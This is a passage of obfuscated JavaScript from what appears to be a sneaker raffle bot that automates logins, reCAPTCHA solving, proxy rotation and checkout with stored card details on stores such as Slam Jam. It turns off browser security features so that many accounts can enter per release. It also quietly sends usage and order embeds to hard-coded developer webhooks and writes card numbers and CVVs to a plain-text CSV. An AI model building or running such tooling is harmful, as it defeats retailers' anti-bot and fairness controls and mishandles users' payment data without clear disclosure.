                        _0x40199d(_0x4eb610['name'] + '\x20Task\x20' + (_0x883800 + 0x1) + '\x20/\x20' + _0x8d9268['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x8d9268, _0x883800);
                        if (_0x8d9268[_0x883800]['Email'] == '' || _0x8d9268[_0x883800]['Password'] == '' || _0x8d9268[_0x883800]['FirstName'] == '' || _0x8d9268[_0x883800]['LastName'] == '') {
                            console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0xb4964b['useRandomProxy'] = ![])
                            var _0x4591e2 = _0x1fca0b[_0x883800]['split'](':');
                        else
                            var _0x51e1da = Math['round'](Math['random']() * (_0x1fca0b['length'] - 0x1)), _0x4591e2 = _0x1fca0b[_0x51e1da]['split'](':');
                        const _0x388833 = await _0x5e99b4['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4591e2[0x0] + ':' + _0x4591e2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x1b1762 = await _0x388833['newPage']();
                            await _0x1b1762['authenticate']({
                                'username': '' + _0x4591e2[0x2],
                                'password': '' + _0x4591e2[0x3]
                            }), await _0x1b1762['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b1762['setRequestInterception'](!![]), _0x1b1762['on']('request', _0x47ed06 => {
                                _0x47ed06['resourceType']() === 'image' || _0x47ed06['resourceType']() === 'font' || _0x47ed06['resourceType']() === 'media' ? _0x47ed06['abort']() : _0x47ed06['continue']();
                            }), await _0x1b1762['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1b1762['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1b1762['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x63444f(0x258), await _0x1b1762['waitForSelector']('#CustomerEmail'), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1b1762['type']('#CustomerEmail', '' + _0x8d9268[_0x883800]['Email']), await _0x63444f(0x12c), await _0x1b1762['type']('#CustomerPassword', '' + _0x8d9268[_0x883800]['Password']), await _0x63444f(0x226), await _0x1b1762['$eval']('#customer_login', _0x9cef88 => _0x9cef88['submit']()), await _0x63444f(0x7d0), await _0x1b1762['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20' + _0x580fd6['cyan']('Solving\x20Captcha')), await _0x1b1762['solveRecaptchas'](), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1b1762['$eval']('.shopify-challenge__container\x20>\x20form', _0x164913 => _0x164913['submit']());
                            try {
                                await _0x1b1762['waitForSelector']('.nav-account'), await _0x63444f(0x4b0);
                            } catch {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1b1762['goto']('' + _0x8d9268[_0x883800]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x63444f(0xbb8), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1b1762['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1b1762['click']('.product-select-variant-wrapper'), await _0x63444f(0x320), await _0x1b1762['click']('li.product-select-variant__value[data-size=\x22' + _0x8d9268[_0x883800]['Size'] + '\x22]'), await _0x63444f(0x384), await _0x1b1762['$eval']('#AddToCartForm-product-template-raffle', _0x2531b9 => _0x2531b9['submit']()), await _0x1b1762['waitForSelector']('.cart-order-summary__content'), await _0x63444f(0x514), await _0x1b1762['goto']('https://drop.slamjam.com/checkout'), await _0x63444f(0x514), await _0x1b1762['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1b1762['select']('#checkout_shipping_address_country', '' + _0x8d9268[_0x883800]['Country']), await _0x63444f(0x200), await _0x1b1762['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1b1762['type']('#checkout_shipping_address_first_name', '' + _0x8d9268[_0x883800]['FirstName']), await _0x63444f(0x237), await _0x1b1762['type']('#checkout_shipping_address_last_name', '' + _0x8d9268[_0x883800]['LastName']), await _0x63444f(0x1e0), await _0x1b1762['type']('#checkout_shipping_address_address1', _0x8d9268[_0x883800]['Address1'] + '\x20' + _0x8d9268[_0x883800]['HouseNumber']), await _0x63444f(0x514), await _0x1b1762['type']('#checkout_shipping_address_address2', '' + _0x8d9268[_0x883800]['Address2']), await _0x63444f(0x514);
                            _0x8d9268[_0x883800]['Postcode'] == undefined && (_0x8d9268[_0x883800]['Postcode'] = _0x8d9268[_0x883800]['Zip']);
                            await _0x1b1762['type']('#checkout_shipping_address_zip', '' + _0x8d9268[_0x883800]['Postcode']), await _0x63444f(0x2bc), await _0x1b1762['type']('#checkout_shipping_address_city', '' + _0x8d9268[_0x883800]['City']), await _0x63444f(0x320), await _0x1b1762['type']('#checkout_shipping_address_phone', '' + _0x8d9268[_0x883800]['Phone']), await _0x63444f(0x320), await _0x1b1762['click']('#continue_button'), await _0x63444f(0xbb8), await _0x1b1762['waitForSelector']('.summary-title'), await _0x63444f(0x320), await _0x1b1762['click']('#continue_button'), await _0x63444f(0x320), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1b1762['waitForSelector']('#checkout_credit_card_vault'), await _0x63444f(0x3e8);
                            var _0x3d22e9 = await _0x1b1762['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x382d78 = await _0x3d22e9['contentFrame']();
                            await _0x382d78['click']('#number'), await _0x63444f(0x3e8), await _0x382d78['type']('#number', '' + _0x8d9268[_0x883800]['CardNumber'], { 'delay': 0x78 }), _0x3d22e9 = await _0x1b1762['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x382d78 = await _0x3d22e9['contentFrame'](), await _0x63444f(0x1c2), await _0x382d78['click']('#name'), await _0x63444f(0x1f4), await _0x382d78['type']('#name', '' + _0x8d9268[_0x883800]['NameOnCard'], { 'delay': 0x78 }), _0x3d22e9 = await _0x1b1762['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x382d78 = await _0x3d22e9['contentFrame'](), await _0x63444f(0x1c2), await _0x382d78['click']('#expiry'), await _0x63444f(0x1f4), await _0x382d78['type']('#expiry', '' + _0x8d9268[_0x883800]['ExpiryDate'], { 'delay': 0x78 }), _0x3d22e9 = await _0x1b1762['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x382d78 = await _0x3d22e9['contentFrame'](), await _0x63444f(0x1c2), await _0x382d78['click']('#verification_value'), await _0x63444f(0x1f4), await _0x382d78['type']('#verification_value', '' + _0x8d9268[_0x883800]['CVV'], { 'delay': 0x78 }), await _0x1b1762['$eval']('#accepts-flag-raffle', _0x9e1564 => _0x9e1564['click']()), await _0x63444f(0x7d0), console['log'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1b1762['$eval']('#continue_button', _0x4fe00b => _0x4fe00b['click']()), await _0x63444f(0x1b58), await _0x1b1762['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1b1762['$eval']('.edit_checkout.animate-floating-labels', _0x1a05c9 => _0x1a05c9['submit']()), await _0x63444f(0x7d0);
                            try {
                                await _0x1b1762['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x2b3144 = 'no', _0xa2d2c6(_0x8d9268[_0x883800], _0x4eb610), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0xf46d09) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0xf46d09['message']);
                            }
                            var _0x2ef6a4 = await _0x4d9326(_0x8d9268[_0x883800], _0x4eb610, 'dev', ![]), _0x1600f1 = await _0x4d9326(_0x8d9268[_0x883800], _0x4eb610, 'pub', ![]);
                            const _0x57d266 = {
                                'succesDEVMSG': { 'embeds': [_0x2ef6a4] },
                                'succesPUBMSG': { 'embeds': [_0x1600f1] }
                            };
                            try {
                                _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x57d266['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x57d266['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0x3501b6, _0x57d266['succesPUBMSG']);
                            } catch (_0x5cc3a1) {
                                console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5cc3a1));
                            }
                        } catch (_0x1c708e) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20' + _0x1c708e)), _0x48bf95 = '' + _0x1c708e;
                            var _0x57a9c2 = await _0x4d9326(kickz[_0x883800], _0x4eb610, 'dev', !![], _0x48bf95);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x57a9c2] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], EMBEDS['errorDEV']), await _0x584f8b(_0x437fba, EMBEDS['errorDEV']), _0x2b3144 = 'yes';
                        } finally {
                            _0x388833 && _0x388833['close']();
                            if (_0x2b3144 == 'yes' && _0x286ef1 != 0x5 && _0x48bf95 != 'Size\x20Not\x20Found') {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x4eb610['name'] + ']\x20Task\x20' + (_0x883800 + 0x1) + '\x20:\x20Retrying')), _0x883800 = _0x883800 - 0x1, _0x286ef1 = _0x286ef1 + 0x1;
                                continue;
                            }
                            _0x2b3144 == 'yes' && _0x286ef1 >= 0x5 && (_0x1d0bc0(_0x8d9268[_0x883800], _0x4eb610), _0x2b3144 = 'no', _0x286ef1 = 0x0), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x239d65) {
                    var _0x2fe4ad = await _0x1317d8(), _0x1ebf8b = _0x442555['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x1dbef6 = _0x3ad1a3['parse'](_0x1ebf8b, { 'header': !![] })['data'];
                    for (var _0x17e2f9 = 0x0; _0x17e2f9 < _0x1dbef6['length']; _0x17e2f9++) {
                        var _0x2ea0a6 = _0x1dbef6[_0x17e2f9]['Store'], _0x3d367c = _0x1dbef6[_0x17e2f9]['Mode'];
                        for (var _0x3b15ba of _0x58a956) {
                            const _0x14dda9 = _0x3b15ba['name']['includes'](_0x2ea0a6);
                            if (!_0x14dda9)
                                continue;
                            for (mode of _0x3b15ba['modules']) {
                                if (mode['name'] == _0x3d367c) {
                                    console['log']('Running\x20' + _0x580fd6['cyan'](mode['name'])), await mode['function'](mode, [_0x1dbef6[_0x17e2f9]], _0x2fe4ad);
                                    var _0x57d2db = _0x1ebf8b['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x442555['writeFileSync']('../failed-tasks.csv', _0x57d2db);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x3895da = await _0x27f157['get']('Answer');
                    if (_0x3895da['Answer']['toLowerCase']() == 'y') {
                        _0x442555['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x63444f(0x3e8);
                        return;
                    }
                    if (_0x3895da['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x63444f(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x63444f(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x1c44c8(_0x59e500) {
    var _0x2649da = await _0x1317d8(), _0x4bbc79 = _0x442555['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xb0c391 = _0x3ad1a3['parse'](_0x4bbc79, { 'header': !![] })['data'];
    for (var _0x1da86b = 0x0; _0x1da86b < _0xb0c391['length']; _0x1da86b++) {
        var _0xc14aec = _0xb0c391[_0x1da86b]['Store'], _0x44f6c8 = _0xb0c391[_0x1da86b]['Mode'];
        for (var _0x3960c2 of _0x58a956) {
            const _0x5703df = _0x3960c2['name']['includes'](_0xc14aec);
            if (_0x5703df)
                for (mode of _0x58a956[_0x3960c2]['modules']) {
                    const _0x1ad24c = mode['name']['includes'](_0x44f6c8);
                    _0x1ad24c && (_0x59e500 = mode['name'], await mode['function'](_0x59e500, _0xb0c391[_0x1da86b], _0x2649da));
                }
        }
    }
}
async function _0x57c050() {
    await _0x518dd0(), console['clear']();
    if (_0x3b25e6 != 'devkey') {
        let _0x1a091b = await _0xe3d259['autoUpdate']();
        if (_0x1a091b === 'yes')
            return _0x3b7642('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1dcebe == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x63444f(0x2710);
        ;
    }
    await _0x7a2cb4(_0x1dcebe);
    if (_0x4bcc31 === ![])
        return console['log']('Closing\x20Browser'), await _0x63444f(0xbb8);
    else
        try {
            var _0x6f802f = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1a887b
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3b25e6
                    }
                ]
            }];
            const _0x2715d6 = { 'embeds': _0x6f802f };
            var _0x14b67c = await _0x4d9326(null, null, 'open', ![]);
            const _0x53e9c5 = { 'openDEVMSG': { 'embeds': [_0x14b67c] } };
            await _0x584f8b(_0x132772, _0x53e9c5['openDEVMSG']);
            async function _0x1d95fb() {
                _0x40199d('JRaffles\x20' + _0x3b25e6), console['clear'](), console['log']('Welcome\x20to\x20' + _0x580fd6['cyan']('JRaffles();') + '\x20' + _0x3b25e6), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1ee74a = 0x0; _0x1ee74a < _0x58a956['length'] - 0x4; _0x1ee74a++) {
                    if (_0x1ee74a >= 0xa) {
                        console['log']('\x20(' + _0x1ee74a + ')\x20[' + _0x58a956[_0x1ee74a]['name'] + ']');
                        continue;
                    }
                    if (_0x58a956[_0x1ee74a]['name'] === 'Reload\x20Settings' || _0x58a956[_0x1ee74a]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1ee74a + ')\x20\x20[' + _0x58a956[_0x1ee74a]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x58a956['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x58a956['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x58a956['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x58a956['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x1c4171();
                if (taskModule > _0x58a956['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x63444f(0x3e8), _0x1d95fb();
                if (_0x58a956[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                    var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x13033b = await _0x1317d8(), _0xed9c33 = await _0x41736d();
                        _0xb4964b['shuffleTasks'] && await _0x27219f(_0xed9c33), await _0x176dd1['function'](_0x176dd1, _0xed9c33, _0x13033b);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x13033b = await _0x1317d8(), _0xed9c33 = await _0x41736d();
                            _0xb4964b['shuffleTasks'] && await _0x27219f(_0xed9c33), await _0x176dd1['function'](_0x176dd1, _0xed9c33, _0x13033b);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x13033b = await _0x1317d8();
                                await _0x176dd1['function'](_0x176dd1, _0x13033b);
                            }
                        }
                    }
                    return _0x1d95fb();
                }
                if (_0x58a956[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                        var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x13033b = await _0x1317d8(), _0x2f8242 = await _0x41736d();
                            _0xb4964b['shuffleTasks'] && await _0x27219f(_0x2f8242), await _0x176dd1['function'](_0x176dd1, _0x2f8242, _0x13033b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x13033b = await _0x1317d8(), _0x2f8242 = await _0x41736d();
                                _0xb4964b['shuffleTasks'] && await _0x27219f(_0x2f8242), await _0x176dd1['function'](_0x176dd1, _0x2f8242, _0x13033b);
                            }
                        }
                    } catch (_0xfaa153) {
                        console['log'](_0xfaa153), await _0x63444f(0xfa0);
                    }
                    return _0x1d95fb();
                }
                if (_0x58a956[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                    var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x13033b = await _0x1317d8();
                        return await _0x176dd1['function'](_0x176dd1, _0x13033b), _0x1d95fb();
                    }
                    var _0x13033b = await _0x1317d8(), _0x44d604 = await _0x41736d();
                    return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x44d604), await _0x176dd1['function'](_0x176dd1, _0x44d604, _0x13033b), _0x1d95fb();
                }
                if (_0x58a956[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                    var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x13033b = await _0x1317d8(), _0x44d604 = await _0x41736d();
                    return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x44d604), await _0x176dd1['function'](_0x176dd1, _0x44d604, _0x13033b), _0x1d95fb();
                } else {
                    if (_0x58a956[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                        var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x13033b = await _0x1317d8(), _0x5f8d32 = await _0x41736d();
                            return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x5f8d32), await _0x176dd1['function'](_0x176dd1, _0x5f8d32, _0x13033b), _0x1d95fb();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x13033b = await _0x1317d8();
                                return await _0x176dd1['function'](_0x176dd1, links, _0x13033b), _0x1d95fb();
                            }
                        }
                        ;
                    } else {
                        if (_0x58a956[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                            var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction], _0x13033b = await _0x1317d8(), _0x3672dd = await _0x41736d();
                            return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x3672dd), await _0x176dd1['function'](_0x176dd1, _0x3672dd, _0x13033b), await _0x63444f(0x1388), _0x1d95fb();
                        } else {
                            if (_0x58a956[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x13033b = await _0x1317d8(), _0x5f8d32 = await _0x41736d();
                                    return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x5f8d32), await _0x176dd1['function'](_0x176dd1, _0x5f8d32, _0x13033b), _0x1d95fb();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x13033b = await _0x1317d8();
                                        return await _0x176dd1['function'](_0x176dd1, links, _0x13033b), _0x1d95fb();
                                    }
                                }
                                ;
                            } else {
                                if (_0x58a956[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                    var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x186e20('https://bouncewear.com/nl/account/register', _0x176dd1);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x58a956[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                        var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x13033b = await _0x1317d8(), _0x248130 = await _0x41736d();
                                            return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x248130), await _0x176dd1['function'](_0x176dd1, _0x248130, _0x13033b), _0x1d95fb();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x13033b = await _0x1317d8(), _0x248130 = await _0x41736d();
                                                return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x248130), await _0x176dd1['function'](_0x176dd1, _0x248130, _0x13033b), _0x1d95fb();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x58a956[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                            var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x13033b = await _0x1317d8(), _0x138291 = await _0x41736d();
                                                return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x138291), await _0x176dd1['function'](_0x176dd1, _0x138291, _0x13033b), _0x1d95fb();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x13033b = await _0x1317d8(), _0x138291 = await _0x41736d();
                                                    return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x138291), await _0x176dd1['function'](_0x176dd1, _0x138291, _0x13033b), _0x1d95fb();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x58a956[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                                var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x13033b = await _0x1317d8(), _0x1b7e39 = await _0x41736d();
                                                    return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x1b7e39), await _0x176dd1['function'](_0x176dd1, _0x1b7e39, _0x13033b), _0x1d95fb();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x13033b = await _0x1317d8(), _0x1b7e39 = await _0x41736d();
                                                        return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x1b7e39), await _0x176dd1['function'](_0x176dd1, _0x1b7e39, _0x13033b), _0x1d95fb();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x58a956[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                                    var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x13033b = await _0x1317d8(), _0x3fba47 = await _0x41736d();
                                                        return _0xb4964b['shuffleTasks'] && await _0x27219f(_0x3fba47), await _0x176dd1['function'](_0x176dd1, _0x3fba47, _0x13033b), _0x1d95fb();
                                                    }
                                                } else {
                                                    if (_0x58a956[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x63444f(0x3e8), _0x1d95fb();
                                                    else {
                                                        if (_0x58a956[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x335b59 = _0x58a956[taskModule]['name'], _0x13033b = await _0x1317d8();
                                                            await _0x342050(_0x335b59, _0x13033b);
                                                        } else {
                                                            if (_0x58a956[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x1d67e4(_0x58a956[taskModule]['modules']);
                                                                var _0x176dd1 = _0x58a956[taskModule]['modules'][taskFunction];
                                                                return await _0x176dd1['function'](_0x176dd1), _0x1d95fb();
                                                            } else {
                                                                if (_0x58a956[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x46f400 = 0x0;
                                                                    for (const _0x39ef7d in _0xb4964b) {
                                                                        console['log']('(' + _0x46f400 + ')\x20' + _0x39ef7d + '\x20:\x20' + _0xb4964b[_0x39ef7d]), _0x46f400++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x46f400 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x32e452 = await _0x5aaaf4();
                                                                    if (_0x32e452 == _0x46f400)
                                                                        return _0x1d95fb();
                                                                    console['clear'];
                                                                    var _0x2141e4 = 0x0;
                                                                    for (var _0x5bd3ec in _0xb4964b) {
                                                                        if (_0x32e452 == _0x2141e4) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x5bd3ec + '\x20:'), _0xb4964b[_0x5bd3ec] = await _0x142065(), _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b));
                                                                            break;
                                                                        } else
                                                                            _0x2141e4++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x63444f(0xbb8), _0x1d95fb();
                                                                } else {
                                                                    if (_0x58a956[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x518dd0(), _0x1d95fb();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x58a956[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x496049 = await _0x1b3cf3();
                                                                            _0x496049 == 'ModuleVoorDeBoys' ? (await _0x4c2cdd(), await _0x2b6fdb(), await afewFunction(_0x232188[_0x4e8292], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x63444f(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1d95fb();
        } catch (_0x472eb6) {
            return console['log'](_0x472eb6), await _0x63444f(0x3a98);
        }
}
;
_0x40199d('JRaffles\x20' + _0x3b25e6), _0x518dd0();
try {
    _0x57c050();
} catch (_0x6ab0af) {
    var _0x4ee2b2 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x1a887b
            },
            {
                'name': 'Version',
                'value': '' + _0x3b25e6
            },
            {
                'name': 'Error',
                'value': '' + _0x6ab0af
            }
        ]
    }];
    const _0x24bd71 = { 'embeds': _0x4ee2b2 };
    _0x584f8b(_0x437fba, _0x24bd71);
}